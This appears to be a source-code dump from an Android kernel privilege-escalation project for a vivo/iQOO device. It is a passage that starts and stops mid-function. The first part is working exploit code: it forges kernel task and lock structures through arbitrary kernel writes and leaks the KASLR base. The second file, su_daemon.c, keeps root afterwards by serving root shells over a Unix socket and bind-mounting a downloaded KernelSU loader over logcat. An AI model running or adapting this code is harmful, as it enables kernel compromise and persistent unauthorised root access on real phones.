         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10,
                         target) &&
         p0_diag_write32(fd, waiter + FAKE_WAITER_PI_TREE_PRIO_OFF,
                         SLIDE_FAKE_WAITER_PRIO) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_TASK_OFF, task) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_LOCK_OFF, lock) &&
         p0_diag_write32(fd, waiter + FAKE_WAITER_WAKE_STATE_OFF, 0) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_WW_CTX_OFF, 0);
#endif
}

static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
  uintptr_t task = payload_base + SLIDE_BANK_TASK_OFF;
  uintptr_t lock = payload_base + SLIDE_BANK_LOCK_OFF;
  uintptr_t waiter = lock + SLIDE_BANK_WAITER_OFF;
  uintptr_t parent = direct_to_page(payload_base);
  uintptr_t target = pipebuf_page_base +
                     P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
  static const char marker[] = "RMG-P0-ORACLE-GATE";
  uintptr_t marker_address = payload_base + P0_ORACLE_GATE_PAGE_OFF;
  if (getenv("P0_ORACLE_READ_DIAG")) {
    marker_address = payload_base;
  }

  if (kernel_write_data(fd, marker_address, marker, sizeof(marker) - 1) !=
          (ssize_t)(sizeof(marker) - 1) ||
      !p0_diag_write32(fd, lock + 0x00, 0) ||
      !p0_diag_write64(fd, lock + 0x08, waiter) ||
      !p0_diag_write64(fd, lock + 0x10, waiter) ||
      !p0_diag_write64(fd, lock + 0x18, SLIDE_LOCK_OWNER_VALUE) ||
      !prepare_p0_diag_waiter(fd, waiter, parent, target, task, lock) ||
      !p0_diag_write32(fd, task + FAKE_TASK_USAGE_OFF, 0x100) ||
      !p0_diag_write32(fd, task + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO) ||
      !p0_diag_write32(fd, task + FAKE_TASK_NORMAL_PRIO_OFF,
                       FAKE_TASK_PRIO) ||
      !p0_diag_write64(fd, task + FAKE_TASK_TASK_GROUP_OFF, 0) ||
      !p0_diag_write32(fd, task + FAKE_TASK_PI_LOCK_OFF, 0) ||
      !p0_diag_write64(fd, task + FAKE_TASK_PI_WAITERS_OFF,
                       waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF) ||
      !p0_diag_write64(fd, task + FAKE_TASK_PI_WAITERS_OFF + 0x08,
                       waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF) ||
      !p0_diag_write64(fd, task + FAKE_TASK_PI_TOP_TASK_OFF, task) ||
      !p0_diag_write64(fd, task + FAKE_TASK_PI_BLOCKED_ON_OFF, 0)) {
    return 0;
  }

  fake_task = task;
  fake_lock = lock;
  fake_w0 = waiter;
  slide_oracle_parent = parent;
  slide_oracle_target = target;
  return 1;
}

int run_p0_pipe_oracle_diagnostic(int fd) {
  uintptr_t fops_page_base = page_base;
  if (!prepare_p0_pipe_oracle() ||
      !prepare_p0_diag_gate_payload(fd, fops_page_base)) {
    pr_error("p0 diagnostic preparation failed pipe=%016zx fops=%016zx\n",
             pipebuf_page_base, fops_page_base);
    return 0;
  }

  uintptr_t target_start = slide_oracle_target - 0x20;
  uintptr_t parent_start = slide_oracle_parent;
  uint64_t original_target = kernel_read64(fd, slide_oracle_target);
  pr_info("p0 diagnostic prepared pipe=%016zx source=%016zx parent=%016zx "
          "target=%016zx original=%016llx\n",
          pipebuf_page_base, fops_page_base, slide_oracle_parent,
          slide_oracle_target, (unsigned long long)original_target);
  dump_p0_oracle_words(fd, "target-before", target_start, 20);
  dump_p0_oracle_words(fd, "parent-before", parent_start, 8);
  if (!slide_trigger_physical_state()) {
    pr_error("p0 diagnostic gate trigger failed\n");
    return 0;
  }
  dump_p0_oracle_words(fd, "target-after", target_start, 20);
  dump_p0_oracle_words(fd, "parent-after", parent_start, 8);
  uint64_t changed_target = kernel_read64(fd, slide_oracle_target);
  if (getenv("P0_ORACLE_READ_DIAG")) {
    int gate_ok = verify_p0_pipe_oracle_gate();
    pr_info("p0 diagnostic pipe read gate=%d\n", gate_ok);
    fflush(NULL);
    for (;;) {
      sleep(60);
    }
  }
  int restore_ok = p0_diag_write64(fd, slide_oracle_target, original_target);
  uint64_t restored_target = kernel_read64(fd, slide_oracle_target);
  pr_info("p0 diagnostic gate complete expected=%016zx changed=%016llx "
          "restore=%d restored=%016llx\n",
          slide_oracle_parent, (unsigned long long)changed_target,
          restore_ok, (unsigned long long)restored_target);
  return restore_ok && restored_target == original_target;
}
#endif

static int slide_commit_stext(uint64_t stext, const char *source) {
  if (stext < KIMAGE_TEXT_BASE) {
    return 0;
  }
  uint64_t slide = stext - KIMAGE_TEXT_BASE;
  if (slide > slide_max_offset || (slide & 0x7fffULL) != 0) {
    pr_warning("slide rejected source=%s stext=%016llx slide=%016llx\n",
               source, (unsigned long long)stext,
               (unsigned long long)slide);
    return 0;
  }
  if (strcmp(source, "pselect") == 0 && slide != slide_p0_offset) {
    pr_warning("slide stale boot_id candidate=%08zx leaked_slide=%08llx\n",
               slide_p0_offset, (unsigned long long)slide);
    return 0;
  }
  kaslr_base = stext;
  kaslr_slide = slide;
  slide_p0_offset = slide;
  kaslr_done = 1;
  data_addr_canonical = strcmp(source, "tracefs") == 0;
  if (data_addr_canonical) {
    app_publish_slide_ready();
  } else {
    app_publish_p0_offset(slide_p0_offset);
  }
  pr_success("slide-kaslr-ok source=%s pid=%d base=%016llx "
             "slide=%016llx data_mode=%s\n",
             source, getpid(), (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide,
             data_addr_canonical ? "canonical" : "physical-alias");
  return 1;
}



int slide_leak_kernel_base(void) {
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
  if (forced_offset_arg && *forced_offset_arg) {
    char *end = NULL;
    errno = 0;
    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
        (value & 0xffffULL) != 0) {
      pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
      return 0;
    }
    const char *gate_page_arg = getenv("P0_GATE_PAGE_STRUCT");
    const char *probe_page_arg = getenv("P0_PROBE_PAGE_STRUCT");
    if (gate_page_arg && probe_page_arg) {
      char *gate_end = NULL;
      char *probe_end = NULL;
      errno = 0;
      p0_gate_page_struct = (uintptr_t)strtoull(
          gate_page_arg, &gate_end, 0);
      p0_probe_page_struct = (uintptr_t)strtoull(
          probe_page_arg, &probe_end, 0);
      if (errno || gate_end == gate_page_arg || *gate_end ||
          probe_end == probe_page_arg || *probe_end) {
        pr_error("slide invalid p0 restore pages gate=%s probe=%s\n",
                 gate_page_arg, probe_page_arg);
        return 0;
      }
    }
    pr_info("slide forced p0 offset=%08llx\n", value);
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
    const char *virtual_base_arg = getenv("SLIDE_VIRTUAL_BASE");
    if (virtual_base_arg && *virtual_base_arg) {
      char *base_end = NULL;
      errno = 0;
      unsigned long long virtual_base =
          strtoull(virtual_base_arg, &base_end, 0);
      slide_p0_offset = (uintptr_t)value;
      if (errno || base_end == virtual_base_arg || *base_end ||
          !slide_commit_virtual_base(virtual_base, "forced-virtual")) {
        pr_error("slide invalid forced virtual base=%s\n", virtual_base_arg);
        return 0;
      }
      return 1;
    }
    return slide_leak_virtual_base((uintptr_t)value);
#else
    return slide_commit_stext(KIMAGE_TEXT_BASE + value, "forced");
#endif
  }
  const char *slide_source = getenv("SLIDE_SOURCE");
  int force_p0 = slide_source && strcmp(slide_source, "p0") == 0;
#if defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE
  int force_tracefs = slide_source && strcmp(slide_source, "tracefs") == 0;
  if (slide_source && *slide_source && !force_p0 && !force_tracefs &&
      strcmp(slide_source, "auto") != 0) {
    pr_error("slide unknown source=%s (use auto, tracefs, or p0)\n",
             slide_source);
    return 0;
  }
  pr_info("slide source mode=%s\n",
          slide_source && *slide_source ? slide_source : "auto");
  if (!force_p0) {
    if (slide_tracefs_leak_kernel_base()) {
      return 1;
    }
    if (force_tracefs) {
      return 0;
    }
    pr_warning("slide tracefs failed; falling back to physical P0\n");
  }
  return slide_leak_physical_base();
#else
  if (slide_source && *slide_source && !force_p0 &&
      strcmp(slide_source, "auto") != 0) {
    pr_error("slide unknown source=%s (use p0 or auto)\n", slide_source);
    return 0;
  }
  pr_info("slide source mode=p0\n");
  return slide_leak_physical_base();
#endif
#else
  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
  uintptr_t forced_offset = 0;
  int forced = forced_offset_arg && *forced_offset_arg;
  if (forced) {
    char *end = NULL;
    errno = 0;
    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
        (value & 0xffffULL) != 0) {
      pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
      return 0;
    }
    forced_offset = (uintptr_t)value;
    pr_info("slide forced p0 offset=%08zx\n", forced_offset);
    return slide_commit_stext(
        KIMAGE_TEXT_BASE + forced_offset, "forced");
  }

  uint64_t existing_stext = slide_read_stext();
  if (existing_stext && slide_commit_stext(existing_stext, "boot_id")) {
    return 1;
  }

  int max_attempts = forced ? 1 : SLIDE_MAX_ATTEMPTS;
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
  if (!page_base) {
    return 0;
  }
#endif
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    if (forced) {
      slide_p0_offset = forced_offset;
    } else {
#ifdef SLIDE_P0_OFFSET_CANDIDATES
      slide_p0_offset = slide_p0_offsets[
          (size_t)(attempt - 1) %
          (sizeof(slide_p0_offsets) / sizeof(slide_p0_offsets[0]))];
#else
      slide_p0_offset = 0;
#endif
    }
    pr_info("slide attempt %d/%d p0_offset=%08zx logger_parent=%016llx "
            "bootid_target=%016llx\n",
            attempt, max_attempts, slide_p0_offset,
            (unsigned long long)(SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset),
            (unsigned long long)(
                SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset));
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
    if (!select_slide_payload_slot(slide_p0_offset)) {
      pr_error("slide payload slot missing p0_offset=%08zx\n",
               slide_p0_offset);
      return 0;
    }
#else
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock) {
      continue;
    }
#endif

    int raw_fds[2];
    SYSCHK(pipe(raw_fds));
    int fds[2];
    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
    SYSCHK(close(raw_fds[0]));
    SYSCHK(close(raw_fds[1]));

    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
      if (getppid() == 1) {
        _exit(1);
      }
      SYSCHK(close(fds[0]));
      disable_rseq_for_thread();
      slide_log_child_context();
      uint64_t stext = slide_child_leak_stext();
      if (stext) {
        SYSCHK(write(fds[1], &stext, sizeof(stext)));
        _exit(0);
      }
      _exit(1);
    }

    SYSCHK(close(fds[1]));
    uint64_t stext = 0;
    ssize_t n = read(fds[0], &stext, sizeof(stext));
    SYSCHK(close(fds[0]));
    int status = 0;
    SYSCHK(waitpid(child, &status, 0));
    if (n != (ssize_t)sizeof(stext) || !WIFEXITED(status) ||
        WEXITSTATUS(status) != 0 || !stext) {
      pr_warning("slide attempt %d failed n=%zd status=%d\n",
                 attempt, n, status);
      continue;
    }

    if (slide_commit_stext(stext, "pselect")) {
      return 1;
    }
  }

  return 0;
#endif
}

```

---

## su_daemon.c

**Path**: `/root/s/references/iQOO-Z9_5G-vivo- research/payload/src/su_daemon.c`

```c
#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <limits.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/system_properties.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <termios.h>
#include <unistd.h>

#define BOOTSTRAP_SOCK_PATH "/data/local/tmp/temp_su.sock"
#define HOLD_READY_SOCKET "cve43499_roothold"
#define SH_PATH "/system/bin/sh"
#ifndef KSU_LOADER_PATH
#define KSU_LOADER_PATH "/data/local/tmp/ksud-s25u-kdp"
#endif

#ifndef KSU_LOADER_FOREGROUND
#define KSU_LOADER_FOREGROUND 0
#endif
#define LOGCAT_PATH "/system/bin/logcat"

static uid_t allowed_client_uid = 2000;

#define SU_PROTOCOL_MAGIC 0x53553235U
#define SU_PROTOCOL_VERSION 1U
#define SU_RESPONSE_MAGIC 0x53555235U
#define SU_MAX_ARGC 256U
#define SU_MAX_ENVC 512U
#define SU_MAX_STRING 65536U
#define SU_MAX_REQUEST_BYTES (1024U * 1024U)
#define SU_PASSED_FDS 5U
#define HOLD_REF_FDS 3U

extern char **environ;

struct su_tty_state {
  uint8_t has_termios;
  uint8_t has_winsize;
  struct termios termios;
  struct winsize winsize;
};

struct su_request_header {
  uint32_t magic;
  uint32_t version;
  uint32_t argc;
  uint32_t envc;
  uint8_t interactive;
  uint8_t reserved[3];
  struct su_tty_state tty;
};

struct su_response {
  uint32_t magic;
  int32_t status;
};

struct su_request {
  struct su_request_header header;
  char **argv;
  char **envp;
  int stdin_fd;
  int stdout_fd;
  int stderr_fd;
  int cwd_fd;
  int io_fd;
};

static int saved_terminal_fd = -1;
static struct termios saved_terminal;

static void restore_terminal(void) {
  if (saved_terminal_fd >= 0) {
    tcsetattr(saved_terminal_fd, TCSANOW, &saved_terminal);
    saved_terminal_fd = -1;
  }
}

static void set_root_env(void) {
  char hostname[PROP_VALUE_MAX];

  setenv("PATH",
         "/product/bin:/apex/com.android.runtime/bin:/apex/com.android.art/bin:"
         "/apex/com.android.virt/bin:/system_ext/bin:/system/bin:/system/xbin:"
         "/odm/bin:/vendor/bin:/vendor/xbin",
         1);
  setenv("HOME", "/data/local/tmp", 1);
  setenv("USER", "root", 1);
  setenv("LOGNAME", "root", 1);
  if (__system_property_get("ro.product.device", hostname) > 0) {
    setenv("HOSTNAME", hostname, 1);
  }
}

static int write_full(int fd, const void *buf, size_t len) {
  const char *p = buf;

  while (len) {
    ssize_t n = write(fd, p, len);
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n <= 0) {
      return 0;
    }
    p += n;
    len -= (size_t)n;
  }
  return 1;
}

static int read_full(int fd, void *buf, size_t len) {
  char *p = buf;

  while (len) {
    ssize_t n = read(fd, p, len);
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n <= 0) {
      return 0;
    }
    p += n;
    len -= (size_t)n;
  }
  return 1;
}

static int connect_daemon(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    perror("su: socket");
    return -1;
  }

  struct sockaddr_un sun;
  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", BOOTSTRAP_SOCK_PATH);

  if (connect(fd, (struct sockaddr *)&sun, sizeof(sun)) != 0) {
    perror("su: connect daemon");
    close(fd);
    return -1;
  }
  return fd;
}

static uint32_t vector_count(char *const values[], uint32_t limit) {
  uint32_t count = 0;

  while (values[count]) {
    if (count == limit) {
      return UINT32_MAX;
    }
    count++;
  }
  return count;
}

static int send_fds(int socket_fd, const int fds[SU_PASSED_FDS]) {
  char marker = 'F';
  struct iovec iov = {
      .iov_base = &marker,
      .iov_len = sizeof(marker),
  };
  char control[CMSG_SPACE(sizeof(int) * SU_PASSED_FDS)];
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  memset(control, 0, sizeof(control));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  msg.msg_control = control;
  msg.msg_controllen = sizeof(control);

  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
  cmsg->cmsg_level = SOL_SOCKET;
  cmsg->cmsg_type = SCM_RIGHTS;
  cmsg->cmsg_len = CMSG_LEN(sizeof(int) * SU_PASSED_FDS);
  memcpy(CMSG_DATA(cmsg), fds, sizeof(int) * SU_PASSED_FDS);

  return sendmsg(socket_fd, &msg, 0) == (ssize_t)sizeof(marker);
}

static int recv_fds(int socket_fd, int fds[SU_PASSED_FDS]) {
  char marker = 0;
  struct iovec iov = {
      .iov_base = &marker,
      .iov_len = sizeof(marker),
  };
  char control[CMSG_SPACE(sizeof(int) * SU_PASSED_FDS)];
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  memset(control, 0, sizeof(control));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  msg.msg_control = control;
  msg.msg_controllen = sizeof(control);

  if (recvmsg(socket_fd, &msg, MSG_CMSG_CLOEXEC) != (ssize_t)sizeof(marker) ||
      marker != 'F') {
    return 0;
  }

  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
  if (!cmsg || cmsg->cmsg_level != SOL_SOCKET || cmsg->cmsg_type != SCM_RIGHTS ||
      cmsg->cmsg_len != CMSG_LEN(sizeof(int) * SU_PASSED_FDS)) {
    return 0;
  }
  memcpy(fds, CMSG_DATA(cmsg), sizeof(int) * SU_PASSED_FDS);
  return 1;
}

static int send_vector(int fd, char *const values[], uint32_t count) {
  for (uint32_t i = 0; i < count; i++) {
    size_t len = strlen(values[i]);
    if (len > SU_MAX_STRING) {
      return 0;
    }
    uint32_t wire_len = (uint32_t)len;
    if (!write_full(fd, &wire_len, sizeof(wire_len)) ||
        !write_full(fd, values[i], wire_len)) {
      return 0;
    }
  }
  return 1;
}

static char **recv_vector(int fd, uint32_t count, size_t *total_bytes) {
  char **values = calloc((size_t)count + 1, sizeof(*values));
  if (!values) {
    return NULL;
  }

  for (uint32_t i = 0; i < count; i++) {
    uint32_t len;
    if (!read_full(fd, &len, sizeof(len)) || len > SU_MAX_STRING ||
        *total_bytes + len > SU_MAX_REQUEST_BYTES) {
      goto fail;
    }
    values[i] = calloc(1, (size_t)len + 1);
    if (!values[i] || !read_full(fd, values[i], len)) {
      goto fail;
    }
    *total_bytes += len;
  }
  return values;

fail:
  for (uint32_t i = 0; i < count; i++) {
    free(values[i]);
  }
  free(values);
  return NULL;
}

static void close_request_fds(struct su_request *request) {
  int *fds[] = {&request->stdin_fd, &request->stdout_fd, &request->stderr_fd,
                &request->cwd_fd, &request->io_fd};
  for (size_t i = 0; i < SU_PASSED_FDS; i++) {
    if (*fds[i] >= 0) {
      close(*fds[i]);
      *fds[i] = -1;
    }
  }
}

static void free_request(struct su_request *request) {
  if (request->argv) {
    for (uint32_t i = 0; i < request->header.argc; i++) {
      free(request->argv[i]);
    }
    free(request->argv);
  }
  if (request->envp) {
    for (uint32_t i = 0; i < request->header.envc; i++) {
      free(request->envp[i]);
    }
    free(request->envp);
  }
  close_request_fds(request);
}

static int recv_request(int conn, struct su_request *request) {
  int fds[SU_PASSED_FDS];
  size_t total_bytes = 0;
  memset(request, 0, sizeof(*request));
  request->stdin_fd = -1;
  request->stdout_fd = -1;
  request->stderr_fd = -1;
  request->cwd_fd = -1;
  request->io_fd = -1;

  if (!recv_fds(conn, fds)) {
    return 0;
  }
  request->stdin_fd = fds[0];
  request->stdout_fd = fds[1];
  request->stderr_fd = fds[2];
  request->cwd_fd = fds[3];
  request->io_fd = fds[4];

  if (!read_full(conn, &request->header, sizeof(request->header)) ||
      request->header.magic != SU_PROTOCOL_MAGIC ||
      request->header.version != SU_PROTOCOL_VERSION ||
      request->header.argc == 0 || request->header.argc > SU_MAX_ARGC ||
      request->header.envc > SU_MAX_ENVC) {
    return 0;
  }

  request->argv =
      recv_vector(conn, request->header.argc, &total_bytes);
  if (!request->argv) {
    return 0;
  }
  request->envp =
      recv_vector(conn, request->header.envc, &total_bytes);
  return request->envp != NULL;
}

static int wait_status(pid_t pid) {
  int status;
  while (waitpid(pid, &status, 0) < 0) {
    if (errno != EINTR) {
      return 1;
    }
  }
  if (WIFEXITED(status)) {
    return WEXITSTATUS(status);
  }
  if (WIFSIGNALED(status)) {
    return 128 + WTERMSIG(status);
  }
  return 1;
}

static int recv_hold_fds(int socket_fd, int fds[HOLD_REF_FDS]) {
  char marker = 0;
  struct iovec iov = {
      .iov_base = &marker,
      .iov_len = sizeof(marker),
  };
  char control[CMSG_SPACE(sizeof(int) * HOLD_REF_FDS)];
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  memset(control, 0, sizeof(control));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  msg.msg_control = control;
  msg.msg_controllen = sizeof(control);

  if (recvmsg(socket_fd, &msg, MSG_CMSG_CLOEXEC) != (ssize_t)sizeof(marker) ||
      marker != 'P') {
    return 0;
  }
  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
  if (!cmsg || cmsg->cmsg_level != SOL_SOCKET || cmsg->cmsg_type != SCM_RIGHTS ||
      cmsg->cmsg_len != CMSG_LEN(sizeof(int) * HOLD_REF_FDS)) {
    return 0;
  }
  memcpy(fds, CMSG_DATA(cmsg), sizeof(int) * HOLD_REF_FDS);
  return 1;
}

static void hold_kernel_references(int conn) {
  int fds[HOLD_REF_FDS] = {-1, -1, -1};
  if (!recv_hold_fds(conn, fds)) {
    return;
  }
  int ready_fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (ready_fd < 0) {
    return;
  }
  struct sockaddr_un ready_address;
  memset(&ready_address, 0, sizeof(ready_address));
  ready_address.sun_family = AF_UNIX;
  memcpy(ready_address.sun_path + 1, HOLD_READY_SOCKET,
         sizeof(HOLD_READY_SOCKET) - 1);
  socklen_t ready_length = (socklen_t)(
      offsetof(struct sockaddr_un, sun_path) + sizeof(HOLD_READY_SOCKET));
  if (bind(ready_fd, (struct sockaddr *)&ready_address, ready_length) != 0 ||
      listen(ready_fd, 4) != 0) {
    close(ready_fd);
    return;
  }
  char acknowledged = 'K';
  if (!write_full(conn, &acknowledged, sizeof(acknowledged))) {
    return;
  }
  prctl(PR_SET_NAME, "cve43499-roothold", 0, 0, 0);
  close(conn);
  for (;;) {
    int probe_fd = accept4(ready_fd, NULL, NULL, SOCK_CLOEXEC);
    if (probe_fd >= 0) {
      close(probe_fd);
    }
  }
}

struct ksu_get_info_cmd {
  uint32_t version;
  uint32_t flags;
  uint32_t features;
  uint32_t uapi_version;
};

static int verify_kernelsu_control(void) {
  int fd = -1;
  int saved_errno = 0;

  /* ksud late-load daemonizes before doing the actual init_module call.  The
   * loader's short-lived parent can therefore exit successfully while the
   * KernelSU control hook is still being installed.  Poll the control entry
   * point instead of treating that normal hand-off window as a load failure. */
  for (int attempt = 0; attempt < 300; ++attempt) {
    fd = -1;
    errno = 0;
    syscall(SYS_reboot, 0xDEADBEEF, 0xCAFEBABE, 0, &fd);
    saved_errno = errno;
    if (fd >= 0) {
      break;
    }
    if (attempt + 1 < 300) {
      usleep(100000);
    }
  }
  if (fd < 0) {
    dprintf(STDERR_FILENO,
            "late-load: KernelSU driver fd unavailable after 30s errno=%d\n",
            saved_errno);
    return 13;
  }

  struct ksu_get_info_cmd info;
  memset(&info, 0, sizeof(info));
  int ret = ioctl(fd, _IOR('K', 2, struct ksu_get_info_cmd), &info);
  saved_errno = errno;
  close(fd);
  if (ret != 0 || info.version == 0 || (info.flags & 1U) == 0 ||
      (info.flags & 4U) == 0) {
    dprintf(STDERR_FILENO,
            "late-load: KernelSU control check failed ret=%d errno=%d "
            "version=%u flags=0x%x\n",
            ret, saved_errno, info.version, info.flags);
    return 14;
  }

  dprintf(STDOUT_FILENO,
          "KernelSU control verified version=%u flags=0x%x "
          "uapi=%u features=0x%x\n",
          info.version, info.flags, info.uapi_version, info.features);
  return 0;
}

static int run_kernelsu_late_load(struct su_request *request, int conn) {
  pid_t pid = fork();
  if (pid < 0) {
    return 1;
  }
  if (pid == 0) {
    if (dup2(request->stdin_fd, STDIN_FILENO) < 0 ||
        dup2(request->stdout_fd, STDOUT_FILENO) < 0 ||
        dup2(request->stderr_fd, STDERR_FILENO) < 0 ||
        fchdir(request->cwd_fd) != 0) {
      _exit(126);
    }
    close(conn);
    close_request_fds(request);

    if (unshare(CLONE_NEWNS) != 0 ||
        mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != 0) {
      dprintf(STDERR_FILENO, "late-load: private mount namespace: %s\n",
              strerror(errno));
      _exit(10);
    }
    if (mount(KSU_LOADER_PATH, LOGCAT_PATH, NULL, MS_BIND, NULL) != 0) {
      dprintf(STDERR_FILENO, "late-load: bind mount: %s\n", strerror(errno));
      _exit(11);
    }

    pid_t loader = fork();
    if (loader < 0) {
      dprintf(STDERR_FILENO, "late-load: fork: %s\n", strerror(errno));
      _exit(12);
    }
    if (loader == 0) {
      /* Let the downloaded target-specific ksud select its embedded module
       * from the running kernel.  Hard-coding android15-6.6 made the shared
       * loader path unusable for exact 6.1 payloads such as E2S. */
#if KSU_LOADER_FOREGROUND
      execl(LOGCAT_PATH, "logcat", "late-load", "--foreground",
            "--package-name", "me.weishu.kernelsu", (char *)NULL);
#else
      execl(LOGCAT_PATH, "logcat", "late-load", "--package-name",
            "me.weishu.kernelsu", (char *)NULL);
#endif
      dprintf(STDERR_FILENO, "late-load: exec: %s\n", strerror(errno));
      _exit(12);
    }

    int loader_status = wait_status(loader);
    if (loader_status != 0) {
      dprintf(STDERR_FILENO,
              "late-load: ksud exited with status=%d\n", loader_status);
      _exit(loader_status);
    }
    _exit(verify_kernelsu_control());
  }
  close_request_fds(request);
  return wait_status(pid);
}

static void send_response(int conn, int status) {
  struct su_response response = {
      .magic = SU_RESPONSE_MAGIC,
      .status = status,
  };
  write_full(conn, &response, sizeof(response));
}

static int prepare_child(struct su_request *request) {
  environ = request->envp;
  if (fchdir(request->cwd_fd) != 0) {
    return 0;
  }
  set_root_env();
  request->argv[0] = "sh";
  return 1;
}

static void close_child_request_fds(struct su_request *request) {
  close_request_fds(request);
}

static int run_direct(struct su_request *request, int conn) {
  pid_t pid = fork();
  if (pid < 0) {
    return 1;
  }
  if (pid == 0) {
    if (dup2(request->stdin_fd, STDIN_FILENO) < 0 ||
        dup2(request->stdout_fd, STDOUT_FILENO) < 0 ||
        dup2(request->stderr_fd, STDERR_FILENO) < 0 ||
        !prepare_child(request)) {
      _exit(126);
    }
    close(conn);
    close_child_request_fds(request);
    execv(SH_PATH, request->argv);
    _exit(127);
  }
  close_request_fds(request);
  return wait_status(pid);
}

static int open_pty_master(char *slave, size_t slave_len) {
  int master = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (master < 0) {
    return -1;
  }
  if (grantpt(master) != 0 || unlockpt(master) != 0 ||
      ptsname_r(master, slave, slave_len) != 0) {
    close(master);
    return -1;
  }
  return master;
}

static int pump_client_io(int tty_fd, int io_fd) {
  char buf[4096];
  int tty_open = 1;

  while (1) {
    struct pollfd pfd[2];
    int nfd = 0;
    if (tty_open) {
      pfd[nfd].fd = tty_fd;
      pfd[nfd].events = POLLIN;
      nfd++;
    }
    pfd[nfd].fd = io_fd;
    pfd[nfd].events = POLLIN;
    int io_index = nfd++;

    int ret = poll(pfd, (nfds_t)nfd, -1);
    if (ret < 0 && errno == EINTR) {
      continue;
    }
    if (ret < 0) {
      return 1;
    }

    if (tty_open) {
      short events = pfd[0].revents;
      if (events & POLLIN) {
        ssize_t n = read(tty_fd, buf, sizeof(buf));
        if (n > 0) {
          if (!write_full(io_fd, buf, (size_t)n)) {
            return 0;
          }
        } else {
          tty_open = 0;
          shutdown(io_fd, SHUT_WR);
        }
      } else if (events & (POLLHUP | POLLERR | POLLNVAL)) {
        tty_open = 0;
        shutdown(io_fd, SHUT_WR);
      }
    }

    short io_events = pfd[io_index].revents;
    if (io_events & POLLIN) {
      ssize_t n = read(io_fd, buf, sizeof(buf));
      if (n > 0) {
        if (!write_full(STDOUT_FILENO, buf, (size_t)n)) {
          return 1;
        }
      } else {
        return 0;
      }
    }
    if (io_events & (POLLHUP | POLLERR | POLLNVAL)) {
      return 0;
    }
  }
}

static int pump_server_pty(int io_fd, int master_fd) {
  char buf[4096];

  while (1) {
    struct pollfd pfd[2] = {
        {.fd = io_fd, .events = POLLIN},
        {.fd = master_fd, .events = POLLIN},
    };
    int ret = poll(pfd, 2, -1);
    if (ret < 0 && errno == EINTR) {
      continue;
    }
    if (ret < 0) {
      return 1;
    }

    if (pfd[0].revents & POLLIN) {
      ssize_t n = read(io_fd, buf, sizeof(buf));
      if (n > 0) {
        if (!write_full(master_fd, buf, (size_t)n)) {
          return 1;
        }
      } else {
        return 1;
      }
    }
    if (pfd[0].revents & (POLLHUP | POLLERR | POLLNVAL)) {
      return 1;
    }

    if (pfd[1].revents & POLLIN) {
      ssize_t n = read(master_fd, buf, sizeof(buf));
      if (n > 0) {
        if (!write_full(io_fd, buf, (size_t)n)) {
          return 1;
        }
      } else {
        return 0;
      }
    }
